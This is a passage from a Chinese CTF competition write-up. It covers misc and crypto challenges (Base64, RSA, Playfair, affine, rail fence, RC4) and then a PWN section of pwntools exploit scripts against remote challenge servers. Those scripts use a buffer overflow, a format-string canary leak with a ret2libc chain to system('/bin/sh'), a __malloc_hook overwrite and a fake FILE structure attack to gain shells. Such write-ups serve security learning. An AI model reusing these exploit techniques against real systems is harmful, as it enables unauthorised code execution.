class="image-box">                <img src="./28.png" alt="图片" title class>                <p>图片</p>            </figure><p>4.</p><figure class="image-box">                <img src="./29.png" alt="图片" title class>                <p>图片</p>            </figure><p>5.</p><figure class="image-box">                <img src="./30.png" alt="图片" title class>                <p>图片</p>            </figure><p>6.</p><figure class="image-box">                <img src="./31.png" alt="图片" title class>                <p>图片</p>            </figure><p>7.</p><figure class="image-box">                <img src="./32.png" alt="图片" title class>                <p>图片</p>            </figure><p>8.</p><figure class="image-box">                <img src="./33.png" alt="图片" title class>                <p>图片</p>            </figure><p>9.</p><figure class="image-box">                <img src="./34.png" alt="图片" title class>                <p>图片</p>            </figure><p>10.</p><figure class="image-box">                <img src="./35.png" alt="图片" title class>                <p>图片</p>            </figure><p>11.</p><figure class="image-box">                <img src="./36.png" alt="图片" title class>                <p>图片</p>            </figure><p>12.</p><figure class="image-box">                <img src="./37.png" alt="图片" title class>                <p>图片</p>            </figure><p>13.</p><p>这就是最终的脚本了。</p><figure class="image-box">                <img src="./38.png" alt="图片" title class>                <p>图片</p>            </figure><p>14.</p><figure class="image-box">                <img src="./39.png" alt="图片" title class>                <p>图片</p>            </figure><p>15.</p><figure class="image-box">                <img src="./40.png" alt="图片" title class>                <p>图片</p>            </figure><p>16.</p><figure class="image-box">                <img src="./41.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="鼠鼠"><a href="#鼠鼠" class="headerlink" title="## 鼠鼠"></a>## 鼠鼠</h2><p>第一段flag在提取的ole的vba代码里</p><figure class="image-box">                <img src="./42.png" alt="图片" title class>                <p>图片</p>            </figure><p>第二段flag需要异或得到</p><figure class="image-box">                <img src="./43.png" alt="图片" title class>                <p>图片</p>            </figure><p>第三段flag在老鼠后面</p><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><figure class="image-box">                <img src="./44.png" alt="图片" title class>                <p>图片</p>            </figure><p>包裹上题目的flag格式提交</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="妈妈我想玩Base64"><a href="#妈妈我想玩Base64" class="headerlink" title="妈妈我想玩Base64"></a>妈妈我想玩Base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">Str=str(base64.b64decode(f.read()),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="string">'''while Str not in 'flag':</span></span><br><span class="line"><span class="string">    Str=str(base64.b64decode(Str),encoding='utf-8')</span></span><br><span class="line"><span class="string">    print(str(i)+'\n')</span></span><br><span class="line"><span class="string">    i=i+1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">    Str=str(base64.b64decode(Str),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    print(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">print(Str)</span><br><span class="line">print(<span class="string">"GG"</span>)</span><br></pre></td></tr></table></figure><p>通过while循环发现base64解密后50次报错 ，用for循环49次，<br>flag{c03781ba-81e9-48a6-afa4-037ee75c8428}</p><p>GG</p><h2 id="SCP-log"><a href="#SCP-log" class="headerlink" title="SCP_log"></a>SCP_log</h2><p>下载好文档打开后里面有几串字母和数字的等式。</p><figure class="image-box">                <img src="./45.png" alt="图片" title class>                <p>图片</p>            </figure><p>经搜索得知是RSA加密，而且这道题恰好给出了RSA加密几个关键的数值.(素数对的乘积n,以及指数e) 这里要弄懂以下函数表达的意义↓.</p><figure class="image-box">                <img src="./46.png" alt="图片" title class>                <p>图片</p>            </figure><p> 故开始进行解题.</p><p>1.对n进行分解</p><p>选择<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a>对n分解,查看是否储存有已经分解成功的N值.</p><figure class="image-box">                <img src="./47.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./48.png" alt="图片" title class>                <p>图片</p>            </figure><p>成功将n值分解为p和q.</p><p>2.计算d值.</p><p>因为得到的p,q,e数值较大.所以从网上找到脚本计算d值.</p><figure class="image-box">                <img src="./49.png" alt="图片" title class>                <p>图片</p>            </figure><p>得到两个d值分别为221840096952962289314707891263857576041和33580702939028137216163981439176632233038140452498081226430421384805976218945</p><p>3.最后用算出的d与网上的脚本将密文c进行解密.</p><figure class="image-box">                <img src="./50.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./51.png" alt="图片" title class>                <p>图片</p>            </figure><p>4.将明文进行组合,得到flag为flag{1721f85a-85ed-4769-8faa-4e15baaaa853}</p><h2 id="啥玩意啊"><a href="#啥玩意啊" class="headerlink" title="啥玩意啊"></a>啥玩意啊</h2><p>题目描述为: flag由3部分组成:hebctf{flag1-flag2-flag3}</p><p>1.flag1由5个字符组成，sha1加密后：8af093ec12abbd25a82abd6d5ed8080afbbfa098</p><p>前3个字符为：odm 第4个字符是个小写字符，最后一个是个数字。</p><p> 解:根据描述知flag1前三位是odm, 经过 猜测 第四位小写字母为s，最后一个数字为1，因此猜测flag1为odms1，经过sha1加密后与描述匹配，确认flag1无误。(真的是猜出来的..)</p><p>2.flag2:playfair加密(有意义的单词)     密文为 kb ky hs   密钥为 flag1去掉数字。</p><p> 解: 通过flag1将密钥补全并填充字母写成5x5矩形.</p><figure class="image-box">                <img src="./52.png" alt="图片" title class>                <p>图片</p>            </figure><p>3.仿射加密 </p><p>key1:它是第3个合格的仿射加密key1(那仿射密码对key1有什么要求？)</p><p>key2:凯撒密码向后移几位它就是几</p><p>密文：srpnv </p><p>解: 仿射密码是将26个字母换成数字,并进行对应数学运算进行加密的加密方式. </p><pre><code>key1讲是第三个合格的仿射加密,即为第三个与26互素的数字,故key1为5 。key2是凯撒密码向后移动的位数, 通常凯撒密码移动的位数为3,故key2为3。则我们可以根据解密函数 {% image https://uploader.shimo.im/f/qQ4UiWl4xMsZGHnH.png!thumbnail '图片' '' %}构建对应表格。</code></pre><figure class="image-box">                <img src="./53.png" alt="图片" title class>                <p>图片</p>            </figure><p>[注释:key1为a的数值，key2为b的数值，m为英文字母总数26，</p><p>a^(-1)应满足<figure class="image-box">                <img src="./54.png" alt="图片" title class>                <p>图片</p>            </figure>，故带入5求得对应数值为21]</p><p>故flag3为disco</p><p>将3个flag合并得到最终答案 hebctf{odms1-helxlo-disco} ,这里应注意,提交答案时应将helxlo中的x去掉,才是正确答案。</p><h2 id="书页要分栏"><a href="#书页要分栏" class="headerlink" title="书页要分栏"></a>书页要分栏</h2><p>小兰听说要给书页分栏，可是明明这本书只有5页欸！</p><p>解:</p><p>将栅栏密码密文 SWDY=zdEAFwVRWlD3RnVUfcFSVDVMTJCyM0VUfNESBl= 解密5次</p><p>得到Base64加密密文 SEVCVFVDVEYlN0JDcnlwdDBfMTVfRWFzWSUyMSU3RA==</p><p>解密得到 HEBTUCTF%7BCrypt0_15_EasY%21%7D </p><p>将其中的 %7B %21 %7D 与ASCII表对应，得出符号为{ ! }</p><p>所以flag应为 HEBTUCTF{Crypt0_15_EasY!}</p><h2 id="蓝精灵"><a href="#蓝精灵" class="headerlink" title="蓝精灵"></a>蓝精灵</h2><p>希尔密码</p><figure class="image-box">                <img src="./55.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h2><p>下载后发现是关于RSA算法，百度一下，<br><figure class="image-box">                <img src="./56.png" alt="图片" title class>                <p>图片</p>            </figure></p><figure class="image-box">                <img src="./57.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./58.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一步：随机两个质数p、q</span><br><span class="line"></span><br><span class="line">第二步：计算n即欧拉函数**n = P * Q，P 与 Q 均为质数，则 φ(n) = φ(P * Q)= φ(P - 1)*φ(Q - 1) = (P - 1)*(Q - 1)  记为m</span><br><span class="line"></span><br><span class="line">第三步：随机选择一个e，条件：1&lt;e&lt;m,e与m互质</span><br><span class="line"></span><br><span class="line">不能选择 φ(n)，这样公钥和私钥就相同了。</span><br><span class="line"></span><br><span class="line">第四步：有一个整数d，使得e*d除以m的余数为1</span><br><span class="line"></span><br><span class="line">不同的e能够生成不同的d，因此可以生成多个密钥对。</span><br><span class="line"></span><br><span class="line">这里不知道e，百度了好久CTFRSA算法，有挺多ctf题都有RSA算法，许多密码学题中的RSA算法，</span><br></pre></td></tr></table></figure><p>里面提到<figure class="image-box">                <img src="./59.png" alt="图片" title class>                <p>图片</p>            </figure>，e=65537，得到私钥d。</p><p>hebtu{4f7b3c45-ab9f-4ab4-a79e}</p><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">9</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];     <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">8</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">8</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];      <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">8</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">8</span>] = &#123; <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="comment">////char key[256] = &#123; "justfortest" &#125;;</span></span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">"kfggtb&#125;thiu[jtXU@2Xeu&#123;uu|"</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">////printf("pData=%s\n", pData);</span></span><br><span class="line">    <span class="comment">////printf("key=%s,length=%d\n\n", key, strlen(key));</span></span><br><span class="line">    <span class="comment">////rc4_init(s, (unsigned char*)key, strlen(key)); //已经完成了初始化</span></span><br><span class="line">    <span class="comment">////printf("完成对S[i]的初始化，如下：\n\n");</span></span><br><span class="line">    <span class="comment">////for (i = 0; i &lt; 256; i++)</span></span><br><span class="line">    <span class="comment">////&#123;</span></span><br><span class="line">    <span class="comment">////    printf("%02X", s[i]);</span></span><br><span class="line">    <span class="comment">////    if (i &amp;&amp; (i + 1) % 16 == 0)putchar('\n');</span></span><br><span class="line">    <span class="comment">////&#125;</span></span><br><span class="line">    <span class="comment">////printf("\n\n");</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已经加密，现在解密:\n\n"</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pData=%s\n\n"</span>, pData);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./60.png" alt="图片" title class>                <p>图片</p>            </figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x01-窝窝头"><a href="#0x01-窝窝头" class="headerlink" title="0x01 窝窝头"></a>0x01 窝窝头</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./wowotou')</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10020</span>)</span><br><span class="line">p.recvuntil(<span class="string">'How much is a sorghum?'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span>+p32(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="0x02-stackpwn2"><a href="#0x02-stackpwn2" class="headerlink" title="0x02 stackpwn2"></a>0x02 stackpwn2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./stackpwn2')</span></span><br><span class="line">p=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'checking the output system...\n'</span>,<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-pwn-disco"><a href="#0x03-pwn-disco" class="headerlink" title="0x03 pwn_disco"></a>0x03 pwn_disco</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x04-Hard-pwn"><a href="#0x04-Hard-pwn" class="headerlink" title="0x04 Hard_pwn"></a>0x04 Hard_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-stackpwn"><a href="#0x05-stackpwn" class="headerlink" title="0x05 